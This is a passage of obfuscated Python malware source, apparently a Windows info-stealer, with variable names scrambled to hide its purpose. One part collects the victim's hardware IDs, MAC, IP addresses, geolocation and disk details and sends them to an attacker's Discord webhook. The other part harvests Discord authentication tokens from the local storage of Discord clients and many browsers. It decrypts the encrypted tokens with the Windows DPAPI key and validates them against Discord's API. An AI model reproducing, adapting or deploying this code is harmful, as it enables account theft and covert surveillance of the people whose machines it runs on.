    except: UDXGCGGOBKMXBELJSJVNYGJRTLHMRHJUHGKNZBSONIQOEWUTLGGSEREBAANCQPIBVECHOKMNDGMTI = "None"

    try:
        SGSWDERZKYFOBMIWGOXRQKGDPQUEJJPUVZRAGDJHDUHXYVJRVYOQJIMZBJSDNAYUSODOHA = []
        DIQKNWUQCPYRRRDUGLZRUIBFWKBLSWSGGRMNIJGFCRZHYYRUSMXCDTMRMPGHKEWGJHLMDHIZA = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if DIQKNWUQCPYRRRDUGLZRUIBFWKBLSWSGGRMNIJGFCRZHYYRUSMXCDTMRMPGHKEWGJHLMDHIZA & 1:
                CWEDNPEIVXMBUMOFTSELUTZBJINRXWUMSQPZTMSRMGRUQLPFLGWXPHULURBONSEBSNJWXPEWDMYTZQLFQQ = v4r_letter + ":\\"
                try:
                    WJBDBCXUDFTHTOCXPIXXYCRNDTPVTXRDMDKQEEWVVDZAWEPJJRXKWHPDHVMCMIH = ctypes.c_ulonglong(0)
                    TVFBGXSPORGJYLRFHFNXVADFBHZUBEDXBMTTVPVVFUPMLQWOSLMDC = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(CWEDNPEIVXMBUMOFTSELUTZBJINRXWUMSQPZTMSRMGRUQLPFLGWXPHULURBONSEBSNJWXPEWDMYTZQLFQQ), None, ctypes.pointer(TVFBGXSPORGJYLRFHFNXVADFBHZUBEDXBMTTVPVVFUPMLQWOSLMDC), ctypes.pointer(WJBDBCXUDFTHTOCXPIXXYCRNDTPVTXRDMDKQEEWVVDZAWEPJJRXKWHPDHVMCMIH))
                    CONDCBDMSWJSBUFJPWUYSBAXJDOYRZANBJUTBZEAWGOIAYEDGTQQCWFNZSWSXIRKGEEZYCP = TVFBGXSPORGJYLRFHFNXVADFBHZUBEDXBMTTVPVVFUPMLQWOSLMDC.value
                    IYICKVWXEQIELCPPQRUZCKJFCAJWJSZWCXMWMTSEMHGZEXDXPXIIQRJQXBGSGSCQDQZDO = WJBDBCXUDFTHTOCXPIXXYCRNDTPVTXRDMDKQEEWVVDZAWEPJJRXKWHPDHVMCMIH.value
                    WBUJYAGXYPFOFAHADLYPAOBKIUYKRRFABWXMSTMWDADTDCOKMSCDBDBRXLBJUPIWDXJEYFVY = CONDCBDMSWJSBUFJPWUYSBAXJDOYRZANBJUTBZEAWGOIAYEDGTQQCWFNZSWSXIRKGEEZYCP - IYICKVWXEQIELCPPQRUZCKJFCAJWJSZWCXMWMTSEMHGZEXDXPXIIQRJQXBGSGSCQDQZDO
                    LUBHMIHNNUBHWPHEYPORCSUQCVMNYEXSZPMPPVTAVVUMVFPHYDOGCADZPHCCFQBRRXFUGLNICDK = win32api.GetVolumeInformation(CWEDNPEIVXMBUMOFTSELUTZBJINRXWUMSQPZTMSRMGRUQLPFLGWXPHULURBONSEBSNJWXPEWDMYTZQLFQQ)[0]
                    drive = {
                        'drive': CWEDNPEIVXMBUMOFTSELUTZBJINRXWUMSQPZTMSRMGRUQLPFLGWXPHULURBONSEBSNJWXPEWDMYTZQLFQQ,
                        'total': CONDCBDMSWJSBUFJPWUYSBAXJDOYRZANBJUTBZEAWGOIAYEDGTQQCWFNZSWSXIRKGEEZYCP,
                        'free': IYICKVWXEQIELCPPQRUZCKJFCAJWJSZWCXMWMTSEMHGZEXDXPXIIQRJQXBGSGSCQDQZDO,
                        'used': WBUJYAGXYPFOFAHADLYPAOBKIUYKRRFABWXMSTMWDADTDCOKMSCDBDBRXLBJUPIWDXJEYFVY,
                        'name': LUBHMIHNNUBHWPHEYPORCSUQCVMNYEXSZPMPPVTAVVUMVFPHYDOGCADZPHCCFQBRRXFUGLNICDK,
                    }
                    SGSWDERZKYFOBMIWGOXRQKGDPQUEJJPUVZRAGDJHDUHXYVJRVYOQJIMZBJSDNAYUSODOHA.append(drive)
                except:
                    ()
            DIQKNWUQCPYRRRDUGLZRUIBFWKBLSWSGGRMNIJGFCRZHYYRUSMXCDTMRMPGHKEWGJHLMDHIZA >>= 1

        SZXHFHYPYNMPZAUTWIVPNAAPBZHEDBLWPYXNKIMQFWHDHVBIIMTBNQVEZQFIMPDOKSIVSZDJNWDIWPQNPMZKMAAS = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in SGSWDERZKYFOBMIWGOXRQKGDPQUEJJPUVZRAGDJHDUHXYVJRVYOQJIMZBJSDNAYUSODOHA:
            YMTXUUKFGNRIMVMVXHULDVSFUKNXDPGUSCXMKFYIEBYRFPXRJUEPTTWSEWJEASDBSHDQ = (v4r_drive['used'] / v4r_drive['total']) * 100
            IYICKVWXEQIELCPPQRUZCKJFCAJWJSZWCXMWMTSEMHGZEXDXPXIIQRJQXBGSGSCQDQZDO_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            CONDCBDMSWJSBUFJPWUYSBAXJDOYRZANBJUTBZEAWGOIAYEDGTQQCWFNZSWSXIRKGEEZYCP_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            YMTXUUKFGNRIMVMVXHULDVSFUKNXDPGUSCXMKFYIEBYRFPXRJUEPTTWSEWJEASDBSHDQ_str = "{:.2f}%".format(YMTXUUKFGNRIMVMVXHULDVSFUKNXDPGUSCXMKFYIEBYRFPXRJUEPTTWSEWJEASDBSHDQ)
            SZXHFHYPYNMPZAUTWIVPNAAPBZHEDBLWPYXNKIMQFWHDHVBIIMTBNQVEZQFIMPDOKSIVSZDJNWDIWPQNPMZKMAAS += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   IYICKVWXEQIELCPPQRUZCKJFCAJWJSZWCXMWMTSEMHGZEXDXPXIIQRJQXBGSGSCQDQZDO_gb,
                                                                   CONDCBDMSWJSBUFJPWUYSBAXJDOYRZANBJUTBZEAWGOIAYEDGTQQCWFNZSWSXIRKGEEZYCP_gb,
                                                                   YMTXUUKFGNRIMVMVXHULDVSFUKNXDPGUSCXMKFYIEBYRFPXRJUEPTTWSEWJEASDBSHDQ_str,
                                                                   v4r_drive['name'])
    except:
        SZXHFHYPYNMPZAUTWIVPNAAPBZHEDBLWPYXNKIMQFWHDHVBIIMTBNQVEZQFIMPDOKSIVSZDJNWDIWPQNPMZKMAAS = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            ECBTPLZLNYYDZPIRMMQKVXQKAGKSKKZBBLNILCQJGXLSELGSHDGXLQFOKPOCPHOGDAUAVBKVFVQOBEXEF = 'Pc Portable'
        else:
            ECBTPLZLNYYDZPIRMMQKVXQKAGKSKKZBBLNILCQJGXLSELGSHDGXLQFOKPOCPHOGDAUAVBKVFVQOBEXEF = 'Pc Fixed'
    except:
        ECBTPLZLNYYDZPIRMMQKVXQKAGKSKKZBBLNILCQJGXLSELGSHDGXLQFOKPOCPHOGDAUAVBKVFVQOBEXEF = "None"

    try: BXLOJMDLXBJRETIOZQWNQZTLSYBXJIDPAVCWBFOANOBTZFFMFOHQ = len(screeninfo.get_monitors())
    except: BXLOJMDLXBJRETIOZQWNQZTLSYBXJIDPAVCWBFOANOBTZFFMFOHQ = "None"

    embed = Embed(title=f'System Info {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:', color=UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {TAFEZCFAVEYHBBURNFNIXQANMIEAIGHCYPZBNJBZCEFBLVHHGEBSYS}
Username    : {ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}
DisplayName : {MEZUSRFYTIXZUQRCQCIRIBKJSSUXBPWGDMVUTMCHHCFZAOCGBJLRUHCTKTQOPEJQTYNABGREEVFYYAEASJVCKTSYFPJRL}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {ECBTPLZLNYYDZPIRMMQKVXQKAGKSKKZBBLNILCQJGXLSELGSHDGXLQFOKPOCPHOGDAUAVBKVFVQOBEXEF}
Exploitation  : {SSLFVRSQYBVWKSNFYADFPRLIRMZXRBJPBWYHKHASZKKCECRMWLLYKNYAKPJQKWSJCFZDQCSY} {AATDVQNOVHPSBEHKLSQODGSETEHINVMIMDVHQZPQTFUIUKDDAGNSNXJMMKN}
Screen Number : {BXLOJMDLXBJRETIOZQWNQZTLSYBXJIDPAVCWBFOANOBTZFFMFOHQ}

HWID : {PRBPTCNJTWOEEWLAVOCEPELLKWNKJVONBVPYXFPDFVBQXWURUPOGBKVFRZPXIUHH}
MAC  : {IDNTQZJIWOVVBZBHHBIKJLGJULWORVGFFHQZOYHNBLJKBUZIYKGXGXNOCALBVRHKDCHOIHZITQCXF}
CPU  : {XKRCVQEACCSWEPWSHDSVNQORKQBVXUXBUABNRUOANIKWDDYWBMLHYGNAQMMTLRYRNGFMYKZRIVDMUFHHMWUUWAJSYFP}, {OEZWAGNLLNBVYZEMWBFDKVOJJMLUOJSSOFFOOPBXTPWCJSIZJQWHEDZTMPOXXYPUXRXTDYHDOELSUXHX} Core
GPU  : {UDXGCGGOBKMXBELJSJVNYGJRTLHMRHJUHGKNZBSONIQOEWUTLGGSEREBAANCQPIBVECHOKMNDGMTI}
RAM  : {OECOTJCONRHBKWUVOEODGLPTFEXKDTZEXVUVLWYGJJEZTSTVCHRSQXHNOTCNUQXQONIBETRWBPLFRXFHDVHDA}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM}
Local  : {VWSLDCXEMFZGVFRIIPGSPEVZKCZZSZSQKRSMERTDYXCECIBMVNR}
Isp    : {XYYIEAGDWHYRMINZXHVKHXAXOYGPKADOIIJABSNZTJYXSVWBKKONZPNZUECFSSTRFOOWKXYUWSVEZGSDIPFRRH}
Org    : {RTVBFRTYKHODWQNTKZKVMGOLACPLYBNUKBZJBZNJTNXOMGBCSLJLFEPILTNWJODMYBGSIMBFLPOSSEFKVQVMJELFABHFOFSCXEE}
As     : {TWEJTGRWLOKIJPSDKWKRGYMFMWUFTNPANSYELMLINGGNHHZOXNJAVBVDXFRNMAWFWLGZMVLGDMKOF}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{SZXHFHYPYNMPZAUTWIVPNAAPBZHEDBLWPYXNKIMQFWHDHVBIIMTBNQVEZQFIMPDOKSIVSZDJNWDIWPQNPMZKMAAS}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {ICWGLNSZUNTUXCXIYHDEAJCUJXNKQANTLWNWAIYMDBKDBYLFSDUXXFLBMGTZNDSQBZMDWSQGVKZSYGWLMQBLPBAEJEWUJCTVF} ({ICWGLNSZUNTUXCXIYHDEAJCUJXNKQANTLWNWAIYMDBKDBYLFSDUXXFLBMGTZNDSQBZMDWSQGVKZSYGWLMQBLPBAEJEWUJCTVF_code})
Region    : {TTIRMKURQMKHPPIHGIWNEJXMFJWMCSQSQUZHBVGIZPHHITXSECALJHEHFKWEMGWRRDWZYSJOHHBCBHWLVVIT} ({TTIRMKURQMKHPPIHGIWNEJXMFJWMCSQSQUZHBVGIZPHHITXSECALJHEHFKWEMGWRRDWZYSJOHHBCBHWLVVIT_code})
Zip       : {COSJDICVDEGDAGDNFJCKFTOVRFQRNFXPWHEUHAFGQJJMGGPKZXKVEFMPDWEHGSOXXI}
City      : {XWPQNDQUYVQPCXCPDCLRKUVOSTOTRBJWYVKLSFEVVFIJKSNMZHMAAIYVXJJOAVMPPHG}
Timezone  : {ISOEKBYJCIZVKQLAFDFRFGGOZEBXCVCAUQWBOQBCTCITYBUXXMCJQXIVGQRKBGLWBFCHYZPAQZSLRQLJSUBSGUUSRHKPZ}
Latitude  : {JPKNZAARIDQENBBVOPEEJTSFVIXFRXKHCUGOBYULODVMLWSXHELKSLTCEH}
Longitude : {JYDZXTWIRMGZCTNYCCTXKVTLAIPSTWDANUHQTCHZHVHCYQDEMRGAMLZ}```""", inline=False)


    embed.set_footer(text=KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY, icon_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)

    JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY = SyncWebhook.from_url(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY)
    JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY.send(embed=embed, username=XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO, avatar_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)

def PEMOSLFXCLRDSYBWGWMZPODFYHPDFBUICEZFZPDUQSFOAYUEADB():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def LBQWYKOYRCWXQLCGFMZUPPRBITRMGXFLUIZPVGRAIZARPWBLCRHFWDQWSMDECSUIGAFTPUQOAOJZJ():
        NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN = "https://discord.com/api/v9/users/@me"
        KKUOQDLCVOZKTEVUJFXLUKPEGWDBNJEMHGYVYBNBWBWEDLHNFOGYRZRWYTQEVXELRTVHVZRPIISLM = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        KKUOQDLCVOZKTEVUJFXLUKPEGWDBNJEMHGYVYBNBWBWEDLHNFOGYRZRWYTQEVXELRTVHVZRPIISLM_enc = r"dQw4w9WgXcQ:[^\"]*"
        TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ = []
        CVUOCCSXFTVUCKFCINCGTDGWMZWRSOZWEZCZUHYKXWPFTEINURRUDQPNFQL = []
        XWGIHVZCIKPLANKQPULGLHZVRRJSRJJKZBUYUPHNGULBPSNLJLLBQRAAAOEJDFVJKAJDIYTYYCCI = {}

        JSAAIVPOPIFCUJGJOKQNNWKVLITXEFICGMBGHVVAYKJXZTSADAOSEZPUL = {
            'Discord': RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT, KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG in JSAAIVPOPIFCUJGJOKQNNWKVLITXEFICGMBGHVVAYKJXZTSADAOSEZPUL.items():
            if not os.path.exists(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
                continue
            RSQXIFJWKSNHYEHICGNENSEIMAJWBWTSOAVNQUDBGDCSZKXRRHOZMTMRRQUMKTUVXYIOGSOOLEGAYMFIDOVMEBYYOVXKWDVIRQC = JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT.replace(" ", "").lower()
            if "cord" in KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG:
                if not os.path.exists(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + f'\\{RSQXIFJWKSNHYEHICGNENSEIMAJWBWTSOAVNQUDBGDCSZKXRRHOZMTMRRQUMKTUVXYIOGSOOLEGAYMFIDOVMEBYYOVXKWDVIRQC}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(KKUOQDLCVOZKTEVUJFXLUKPEGWDBNJEMHGYVYBNBWBWEDLHNFOGYRZRWYTQEVXELRTVHVZRPIISLM_enc, v4r_line.strip()):
                                OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT = TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), HURBTAYTSDEFJYYWXRIPCZDAFHUUVPWRWWCJBUMWDNCRQXPNWMWRLBOSNDVOPJWNCFVQLABADMZJROMTNNHSZIBFKWYAM(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + f'\\{RSQXIFJWKSNHYEHICGNENSEIMAJWBWTSOAVNQUDBGDCSZKXRRHOZMTMRRQUMKTUVXYIOGSOOLEGAYMFIDOVMEBYYOVXKWDVIRQC}\\Local State'))
                                if CYHJQLRZHPRZLNDAKCSAWWLQSLAIOVXXIKIYRWJERNFNPUFHVNPATSOLNUWIHUXDWC(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT, NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN):
                                    NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT = requests.get(NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN, headers={'Authorization': OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT}).json()['id']
                                    if NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT not in CVUOCCSXFTVUCKFCINCGTDGWMZWRSOZWEZCZUHYKXWPFTEINURRUDQPNFQL:
                                        TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ.append(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT)
                                        CVUOCCSXFTVUCKFCINCGTDGWMZWRSOZWEZCZUHYKXWPFTEINURRUDQPNFQL.append(NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT)
                                        XWGIHVZCIKPLANKQPULGLHZVRRJSRJJKZBUYUPHNGULBPSNLJLLBQRAAAOEJDFVJKAJDIYTYYCCI[OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT] = (JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT, f"{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT in re.findall(KKUOQDLCVOZKTEVUJFXLUKPEGWDBNJEMHGYVYBNBWBWEDLHNFOGYRZRWYTQEVXELRTVHVZRPIISLM, v4r_line.strip()):
                                if CYHJQLRZHPRZLNDAKCSAWWLQSLAIOVXXIKIYRWJERNFNPUFHVNPATSOLNUWIHUXDWC(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT, NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN):
                                    NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT = requests.get(NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN, headers={'Authorization': OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT}).json()['id']
                                    if NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT not in CVUOCCSXFTVUCKFCINCGTDGWMZWRSOZWEZCZUHYKXWPFTEINURRUDQPNFQL:
                                        TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ.append(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT)
                                        CVUOCCSXFTVUCKFCINCGTDGWMZWRSOZWEZCZUHYKXWPFTEINURRUDQPNFQL.append(NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT)
                                        XWGIHVZCIKPLANKQPULGLHZVRRJSRJJKZBUYUPHNGULBPSNLJLLBQRAAAOEJDFVJKAJDIYTYYCCI[OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT] = (JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT, f"{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\\{v4r_file_name}")

